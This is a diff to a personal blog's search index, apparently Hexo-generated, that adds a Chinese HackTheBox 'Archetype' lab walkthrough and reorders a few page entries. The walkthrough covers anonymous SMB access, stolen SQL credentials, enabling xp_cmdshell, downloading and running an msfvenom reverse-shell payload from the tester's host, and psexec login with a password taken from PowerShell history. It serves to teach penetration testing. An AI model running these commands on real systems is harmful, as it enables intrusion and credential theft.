@@ -29,6 +29,39 @@
     
     
     <entry>
+      <title>[HTB] Archetype 渗透测试笔记</title>
+      <link href="/posts/98873ddf.html"/>
+      <url>/posts/98873ddf.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="HackTheBox-Archetype-靶场的完整渗透流程"><a href="#HackTheBox-Archetype-靶场的完整渗透流程" class="headerlink" title="HackTheBox:Archetype 靶场的完整渗透流程"></a>HackTheBox:Archetype 靶场的完整渗透流程</h1><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -sV -Pn 10.129.75.207</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754037816.webp" alt="nmap扫描"></p><h3 id="445是smb-共享文件协议-端口，在未配置权限情况下可能允许匿名访问共享文件夹。"><a href="#445是smb-共享文件协议-端口，在未配置权限情况下可能允许匿名访问共享文件夹。" class="headerlink" title="445是smb(共享文件协议)端口，在未配置权限情况下可能允许匿名访问共享文件夹。"></a>445是smb(共享文件协议)端口，在未配置权限情况下可能允许匿名访问共享文件夹。</h3><h2 id="二、SMB-信息收集"><a href="#二、SMB-信息收集" class="headerlink" title="二、SMB 信息收集"></a>二、SMB 信息收集</h2><h3 id="尝试空密码进行SMB登陆"><a href="#尝试空密码进行SMB登陆" class="headerlink" title="尝试空密码进行SMB登陆"></a>尝试空密码进行SMB登陆</h3><h3 id="1-L表示列出共享资源"><a href="#1-L表示列出共享资源" class="headerlink" title="1. -L表示列出共享资源"></a>1. -L表示列出共享资源</h3><h3 id="2-N表示不使用密码"><a href="#2-N表示不使用密码" class="headerlink" title="2. -N表示不使用密码"></a>2. -N表示不使用密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L -N //10.129.75.207/</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754038484.webp" alt="SMB登陆"></p><h3 id="发现backups目录"><a href="#发现backups目录" class="headerlink" title="发现backups目录"></a>发现backups目录</h3><h3 id="SMB连接并列出目录内容，下载有用文件"><a href="#SMB连接并列出目录内容，下载有用文件" class="headerlink" title="SMB连接并列出目录内容，下载有用文件"></a>SMB连接并列出目录内容，下载有用文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.129.75.207/backups -N</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">smb: \&gt; get prod.dtsConfig</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754038500.webp" alt="下载文件"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> prod.dtsConfig</span><br></pre></td></tr></table></figure><h3 id="发现账号密码"><a href="#发现账号密码" class="headerlink" title="发现账号密码"></a>发现账号密码</h3><p><img src="/img/htb/archetype/1754038520.webp" alt="prod.dtsConfig内容"></p><h2 id="三、MSSQL-利用"><a href="#三、MSSQL-利用" class="headerlink" title="三、MSSQL 利用"></a>三、MSSQL 利用</h2><h3 id="1-使用网络协议包impacket中的mssqlclient连接SQL-server-服务器"><a href="#1-使用网络协议包impacket中的mssqlclient连接SQL-server-服务器" class="headerlink" title="1.使用网络协议包impacket中的mssqlclient连接SQL server 服务器"></a>1.使用网络协议包impacket中的mssqlclient连接SQL server 服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc@10.129.75.207</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754039411.webp" alt="连接SQL server"></p><h3 id="同时检查数据库权限"><a href="#同时检查数据库权限" class="headerlink" title="同时检查数据库权限"></a>同时检查数据库权限</h3><details><summary>⚠ 易错提示，点击查看</summary>注意这里的 `/` 不能写成 `\`，  正确：`ARCHETYPE/sql_svc@10.129.75.207`  错误：`ARCHETYPE\sql_svc@10.129.75.207`（会导致连接失败）</details><h2 id="四、获取shell"><a href="#四、获取shell" class="headerlink" title="四、获取shell"></a>四、获取shell</h2><h3 id="1-使用xp-cmdshell执行命令"><a href="#1-使用xp-cmdshell执行命令" class="headerlink" title="1. 使用xp_cmdshell执行命令"></a>1. 使用xp_cmdshell执行命令</h3><details><summary>💡 关于 xp_cmdshell</summary>`xp_cmdshell` 是 SQL Server 内置的扩展存储过程，允许直接在数据库中执行系统命令（调用 Windows 命令行解释器）。  它的常见用途包括：- 执行系统级脚本- 下载文件- 启动其他程序如果数据库账号有高权限（如 `sysadmin`），攻击者可以利用 `xp_cmdshell` 在目标系统上执行任意命令，从而直接拿到系统权限。</details><h3 id="我们需要修改配置"><a href="#我们需要修改配置" class="headerlink" title="我们需要修改配置"></a>我们需要修改配置</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><h3 id="执行命令成功后检查"><a href="#执行命令成功后检查" class="headerlink" title="执行命令成功后检查"></a>执行命令成功后检查</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754039426.webp" alt="执行whoami"></p><h3 id="2-利用msf生成exe上传并执行"><a href="#2-利用msf生成exe上传并执行" class="headerlink" title="2. 利用msf生成exe上传并执行"></a>2. 利用msf生成exe上传并执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.34 LPORT=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><h3 id="启动http服务，开启8000端口"><a href="#启动http服务，开启8000端口" class="headerlink" title="启动http服务，开启8000端口"></a>启动http服务，开启8000端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044233.webp" alt="生成exe,启动http"></p><h3 id="3-通过mssql下载到可下载目录下"><a href="#3-通过mssql下载到可下载目录下" class="headerlink" title="3. 通过mssql下载到可下载目录下"></a>3. 通过mssql下载到可下载目录下</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.34:8000/shell.exe -outfile shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044252.webp" alt="下载shell.exe"></p><h3 id="4-msf监听并执行shell-exe"><a href="#4-msf监听并执行shell-exe" class="headerlink" title="4. msf监听并执行shell.exe"></a>4. msf监听并执行shell.exe</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.10.16.34</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;C:\Users\sql_svc\Downloads\shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044221.webp" alt="执行shell.exe"></p><h3 id="五、获取系统权限system"><a href="#五、获取系统权限system" class="headerlink" title="五、获取系统权限system"></a>五、获取系统权限system</h3><h3 id="1-查看powershell历史命令"><a href="#1-查看powershell历史命令" class="headerlink" title="1. 查看powershell历史命令"></a>1. 查看powershell历史命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044204.webp" alt="powershell历史命令"></p><h3 id="2-利用psexec进行登陆连接"><a href="#2-利用psexec进行登陆连接" class="headerlink" title="2. 利用psexec进行登陆连接"></a>2. 利用psexec进行登陆连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator@10.129.75.207</span><br></pre></td></tr></table></figure><p><img src="/img/htb/archetype/1754044184.webp" alt="psexec登陆"></p><details><summary>💡 关于 PsExec（点击展开）</summary>PsExec 是一种轻型 telnet-replacement，可用于在其他系统上执行进程，无需手动安装客户端软件即可完成控制台应用程序的完整交互性。  PsExec 最强大的用途包括在远程系统和远程启用工具（如 IpConfig）上启动交互式命令提示符。  psexec 的使用不需要对方主机开启 3389 端口，只需要对方开启 admin 共享或 c 盘共享（默认开启，依赖于 445 端口）。  但是，假如目标主机开启了防火墙（默认禁止 445 端口连接），psexec 也是不能使用的，会提示找不到网络路径。  由于 psexec 是 Windows 提供的工具，所以杀毒软件会将其添加到白名单中。  </details><p>完成！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次 HTB Archetype 靶场主要学习了：</p><ul><li>SMB 匿名访问与敏感文件泄露</li><li>MSSQL 连接与 xp_cmdshell 命令执行</li><li>利用 MSF 生成木马并反弹 shell</li><li>Windows 提权思路（历史命令获取明文密码 + psexec）</li></ul><p>此外在使用靶场环境时候，为了防止靶场文件不知道放在那里，最好在powershell开始之前先切换靶场目录。</p><p>在执行反弹shell的时候一定要小心lhost和lport不要写错。</p><p>在本次测试中，也遇到了一些没遇到过的问题，比如：</p><ul><li>MSSQL 连接时的路径问题（<code>/</code> 和 <code>\</code> 的区别）</li><li>Powershell 历史命令的存储位置</li></ul><p>以上是本次测试的总结，再接再厉！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> htb </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTB </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> Windows </tag>
+            
+            <tag> MSSQL </tag>
+            
+            <tag> SMB </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>靶场文章标题</title>
       <link href="/posts/8283a223.html"/>
       <url>/posts/8283a223.html</url>
@@ -193,17 +226,6 @@
     
     
     <entry>
-      <title>记录美好时刻</title>
-      <link href="/gallery/index.html"/>
-      <url>/gallery/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title></title>
       <link href="/css/custom.css"/>
       <url>/css/custom.css</url>
@@ -215,11 +237,11 @@
     
     
     <entry>
-      <title></title>
-      <link href="/js/title.js"/>
-      <url>/js/title.js</url>
+      <title>记录美好时刻</title>
+      <link href="/gallery/index.html"/>
+      <url>/gallery/index.html</url>
       
-        <content type="html"><![CDATA[//动态标题var OriginTitile = document.title;var titleTime;document.addEventListener("visibilitychange", function () {  if (document.hidden) {    //离开当前页面时标签显示内容    document.title = "w(ﾟДﾟ)w 不要走！再看看嘛！";    clearTimeout(titleTime);  } else {    //返回当前页面时标签显示内容    document.title = "♪(^∇^*)欢迎肥来！" + OriginTitile;    //两秒后变回正常标题    titleTime = setTimeout(function () {      document.title = OriginTitile;    }, 2000);  }});]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
@@ -237,6 +259,17 @@
     
     
     <entry>
+      <title></title>
+      <link href="/js/title.js"/>
+      <url>/js/title.js</url>
+      
+        <content type="html"><![CDATA[//动态标题var OriginTitile = document.title;var titleTime;document.addEventListener("visibilitychange", function () {  if (document.hidden) {    //离开当前页面时标签显示内容    document.title = "w(ﾟДﾟ)w 不要走！再看看嘛！";    clearTimeout(titleTime);  } else {    //返回当前页面时标签显示内容    document.title = "♪(^∇^*)欢迎肥来！" + OriginTitile;    //两秒后变回正常标题    titleTime = setTimeout(function () {      document.title = OriginTitile;    }, 2000);  }});]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>友情链接</title>
       <link href="/link/index.html"/>
       <url>/link/index.html</url>
@@ -248,9 +281,9 @@
     
     
     <entry>
-      <title>music</title>
-      <link href="/music/index.html"/>
-      <url>/music/index.html</url>
+      <title>电影</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -259,9 +292,9 @@
     
     
     <entry>
-      <title>电影</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
+      <title>music</title>
+      <link href="/music/index.html"/>
+      <url>/music/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
